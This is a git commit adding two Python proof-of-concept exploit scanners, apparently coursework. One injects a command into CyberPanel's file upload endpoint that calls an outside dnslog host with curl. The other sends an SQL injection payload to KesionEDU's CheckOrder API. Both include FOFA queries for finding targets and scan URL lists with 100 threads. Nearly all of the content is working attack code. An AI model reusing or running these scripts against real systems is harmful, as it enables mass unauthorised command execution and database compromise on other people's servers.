cdd255be0f631a68617ec0aa0e43c6f906d2555d
Bing-cell-sys <752291432@qq.com>
2025-10-22 19:44:23 +0800

    Add files via upload

---
+++ demo_作业_4.py
@@ -0,0 +1,74 @@
+#Cyber Panel upload 远程命令执行
+#fofa：app="CyberPanel"
+import requests,argparse,sys
+import urllib3
+import warnings
+from multiprocessing.dummy import Pool # 多线程的库
+
+# 禁用不安全请求警告
+urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
+def main():
+    # 初始化
+    parse = argparse.ArgumentParser(description="Cyber Panel upload 远程命令执行")
+
+    # 添加命令行参数
+    parse.add_argument('-u','--url',dest='url',type=str,help='please input your link')
+    parse.add_argument('-f','--file',dest='file',type=str,help='please input your file')
+
+    # 实例化
+    args = parse.parse_args()
+
+    # 对用户输入的参数做判断 输入正确 url file 输入错误弹出提示
+    if args.url and not args.file:
+        poc(args.url)
+    elif args.file and not args.url:
+        # 多线程处理
+        url_list = [] # 用于接收读取文件之后的url
+        with open(args.file,'r',encoding='utf-8') as fp:
+            for url in fp.readlines():
+                url_list.append(url.strip())
+        mp = Pool(100)
+        mp.map(poc,url_list)
+        mp.close
+        mp.join
+        
+    else:
+        print(f"Usage python {sys.argv[0]} -h")
+def poc(target):
+    link = "/filemanager/upload"
+    boundary = "----NewBoundary123456789"
+    headers = {
+        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.198 Safari/537.36",
+        "Content-Type": f"multipart/form-data; boundary={boundary}",
+        "Connection": "close"
+    }
+    data = f"""--{boundary}
+Content-Disposition: form-data; name="domainName"
+
+<target>
+--{boundary}
+Content-Disposition: form-data; name="completePath"
+
+curl http://dtrz.dnslog.cn/
+--{boundary}
+Content-Disposition: form-data; name="file"; filename="poc.txt"
+
+pwn
+--{boundary}--"""
+    try:
+        res1 = requests.get(url=target,headers=headers,verify=False,timeout=5)
+        if res1.status_code == 200:
+            res2 = requests.post(url=target+link,headers=headers,data=data,verify=False,timeout=5)
+            if res2.status_code == 200 and "error_message" in res2.text:
+                print(f"[+]该{target}存在文件上传/命令执行漏洞")
+                # 写入到一个文件中
+                with open('result.txt','a',encoding='utf-8') as f:
+                    f.write(f"[+]该{target}存在文件上传/命令执行漏洞\n")
+            else:
+                print(f"[-]该{target}不存在文件上传/命令执行漏洞")
+    except:
+        print(f"该{target}存在问题，请手工测试")
+# 函数入口
+
+if __name__ == "__main__":
+    main()
---
+++ demo_作业_5.py
@@ -0,0 +1,78 @@
+#科汛网校KesionEDU CheckOrder sQL注入
+#fofa：body="/KS_Inc/static/edu"
+import requests,argparse,sys
+import urllib3
+import warnings
+from multiprocessing.dummy import Pool # 多线程的库
+
+# 禁用不安全请求警告
+urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
+def banner():
+    test="""                                                                                                     
+,--------. ,--.                   ,---. ,--.                   ,--.       ,------.           ,-----. 
+'--.  .--' |  ,---.   ,---.      /  .-' `--' ,--.--.  ,---.  ,-'  '-.     |  .--. '  ,---.  '  .--./ 
+   |  |    |  .-.  | | .-. :     |  `-, ,--. |  .--' (  .-'  '-.  .-'     |  '--' | | .-. | |  |     
+   |  |    |  | |  | \   --.     |  .-' |  | |  |    .-'  `)   |  |       |  | --'  ' '-' ' '  '--'\ 
+   `--'    `--' `--'  `----'     `--'   `--' `--'    `----'    `--'       `--'       `---'   `-----' 
+                                                                                                    author:Bing
+                                                                                                    version:1.0"""
+    print(test)
+def main():
+    banner()
+    # 初始化
+    parse = argparse.ArgumentParser(description="科汛网校KesionEDU CheckOrder sQL注入")
+
+    # 添加命令行参数
+    parse.add_argument('-u','--url',dest='url',type=str,help='please input your link')
+    parse.add_argument('-f','--file',dest='file',type=str,help='please input your file')
+
+    # 实例化
+    args = parse.parse_args()
+
+    # 对用户输入的参数做判断 输入正确 url file 输入错误弹出提示
+    if args.url and not args.file:
+        poc(args.url)
+    elif args.file and not args.url:
+        # 多线程处理
+        url_list = [] # 用于接收读取文件之后的url
+        with open(args.file,'r',encoding='utf-8') as fp:
+            for url in fp.readlines():
+                url_list.append(url.strip())
+        mp = Pool(100)
+        mp.map(poc,url_list)
+        mp.close
+        mp.join
+        
+    else:
+        print(f"Usage python {sys.argv[0]} -h")
+
+def poc(target):
+    link = "/webapi/APP/CheckOrder"
+    headers = {
+        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:132.0) Gecko/20100101 Firefox/132.0",
+        "Accept": "application/json, text/javascript, */*; q=0.01",
+        "Accept-Language": "zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2",
+        "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
+        "X-Requested-With": "XMLHttpRequest",
+        "Accept-Encoding": "gzip, deflate",
+        "Priority": "u=0",
+        "Connection": "close"
+    }
+    data = {"orderid":"1' AND 7755 IN (SELECT (CHAR(113)+CHAR(107)+CHAR(112)+CHAR(122)+CHAR(113)+(SELECT (CASE WHEN (7755=7755) THEN CHAR(49) ELSE CHAR(48) END))+CHAR(113)+CHAR(113)+CHAR(107)+CHAR(107)+CHAR(113)))-- Ahbw","apptoken":"1","ordertype":"1"}
+    try:
+        res1 = requests.get(url=target,headers=headers,verify=False,timeout=5)
+        if res1.status_code == 200:
+            res2 = requests.post(url=target+link,headers=headers,json=data,verify=False,timeout=5)
+            if res2.status_code == 500 and "SqlException" in res2.text:
+                print(f"[+]该{target}存在SQL注入漏洞")
+                # 写入到一个文件中
+                with open('result.txt','a',encoding='utf-8') as f:
+                    f.write(f"[+]该{target}存在SQL注入漏洞\n")
+            else:
+                print(f"[-]该{target}不存在SQL注入漏洞")
+    except:
+        print(f"该{target}存在问题，请手工测试")
+# 函数入口
+
+if __name__ == "__main__":
+    main()
